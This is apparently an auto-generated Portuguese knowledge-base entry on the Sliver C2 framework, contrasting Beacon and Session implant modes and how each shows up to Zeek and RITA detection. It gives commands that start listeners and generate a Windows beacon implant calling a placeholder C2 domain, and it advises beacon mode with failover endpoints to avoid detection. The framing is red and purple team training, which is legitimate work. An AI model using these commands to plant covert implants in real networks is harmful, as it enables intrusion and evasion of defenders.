---
id: software.seguranca.tranche16.001542
tipo: tecnica
dominio: software
subdominio: seguranca
nivel: intermediario
confianca: media
ultima_verificacao: 2026-10-03
validade: volatil
status: candidata
revisao_humana: nao_solicitada
revisor: ""
revisao_ia: aprovada
revisor_ia: "Arena.ai Agent Mode"
data_revisao_ia: 2026-10-03
relatorio_revisao_ia: "knowledge-federation/exports/reports/ai-review-software-seguranca-2000-0003-tranche-16.md"
fontes: ["https://raw.githubusercontent.com/BishopFox/sliver/master/README.md", "https://sliver.sh/docs?name=Getting+Started"]
tags: [dominio/software, subdominio/seguranca, qualidade/candidata]
lote: software-seguranca-2000-0003
---

# Implantes Sliver: **Beacon Mode (Assíncrono com Intervalo + Jitter)** vs. **Session Mode (Tempo Real)** e Promoção On-Demand com **`interactive`**

## Em uma frase
Qual é a diferença tática e de furtividade na rede (*Network OPSEC*) entre gerar um implante do Sliver em **Beacon Mode (`generate beacon`)** vs. **Session Mode (`generate`)**, e como essa escolha impacta a detecção por ferramentas de caça a ameaças como o **RITA / Zeek** que estudamos na Tranche 14?

## Por que importa
Conforme detalhado na seção *Implants: Beacon vs. Session* do `Getting Started`, em **Session Mode**, o implante mantém uma **conexão persistente contínua (ou *long polling* constante)** com o servidor C2 para resposta instantânea em tempo real — excelente para ações rápidas como `shell` ou `portfwd`, mas facilmente visível como uma **Long Connection** nos sensores **Zeek / RITA / Arkime**!

## Como funciona
Já em **Beacon Mode**, o implante opera de forma **100% assíncrona**: ele dorme por `--seconds 60` (ou horas!) com variação aleatória **`--jitter 30`**, acorda brevemente, busca tarefas na fila do servidor, executa, devolve o resultado e fecha a conexão TCP/TLS imediatamente! E quando o operador precisa de uma sessão interativa temporária a partir de um Beacon, basta executar o comando **`interactive`** naquele Beacon!

## Exemplo
```text
# Gerar no console do Sliver um implante Beacon assincrono (intervalo de 120s com jitter de 30s) sobre mTLS e HTTPS com fallback
sliver > mtls --lport 8888
sliver > https --domain c2.exemplo.br --lport 443
sliver > generate beacon --mtls c2.exemplo.br:8888 --http https://c2.exemplo.br:443 --seconds 120 --jitter 30 --os windows --arch amd64 --save /tmp/
```

## Limites e trade-offs
Veja duas regras operacionais importantes documentadas no guia oficial sobre **Beacons vs. Sessions**: **(1)** Um implante compilado inicialmente como **Beacon** pode abrir uma **Session** interativa sob demanda a qualquer momento com o comando **`interactive`** (sobre qualquer protocolo C2 com o qual ele tenha sido compilado, encerrando depois com `close`); porém **(2)** Um implante compilado inicialmente como **Session NÃO pode ser convertido em Beacon** posteriormente!

## Como verificar
Portanto, em exercícios de Red Team e Purple Team realistas, gere seus implantes principais sempre como **`generate beacon`** com múltiplos endpoints C2 de failover (`--mtls ... --http ...`) e só promova para `interactive` nos minutos exatos em que precisar usar `portfwd`, `socks5` ou `pivots`!

## Conexões
- [[sliver-arquitetura-c2-emulacao-adversarios-mtls-wireguard-http-dns]] — Veja também: Arquitetura do **Sliver C2 (`BishopFox/sliver`)**: Emulação de Adversários Multi-Plataforma em Go, Chaves Assimétricas por Binário e Protocolos **mTLS, WireGuard, HTTP(S) e DNS**.
- [[sliver-protocolos-transporte-mtls-wireguard-https-dns-traffic-encoders]] — Veja também: Engenharia dos 4 Canais de Transporte C2 do Sliver (**`mtls`**, **`wg` WireGuard**, **`https` C2 Profiles** e **`dns` Canário**) e **Traffic Encoders (Wasm)**.

## Fontes
- [Sliver Adversary Emulation Framework Official Repository (`BishopFox/sliver`)](https://raw.githubusercontent.com/BishopFox/sliver/master/README.md) — repositório oficial do framework C2 Sliver em Go cobrindo implantes multi-plataforma, chaves assimétricas únicas por binário e execução BOF/COFF; consultado em 2026-10-03.
- [Sliver Official Documentation — Getting Started (`sliver.sh/docs?name=Getting+Started`)](https://sliver.sh/docs?name=Getting+Started) — documentação oficial do Sliver detalhando arquitetura Server/Multiplayer, diferença entre `Beacon Mode` e `Session Mode`, geração de implantes, `interactive` e Stagers; consultado em 2026-10-03.
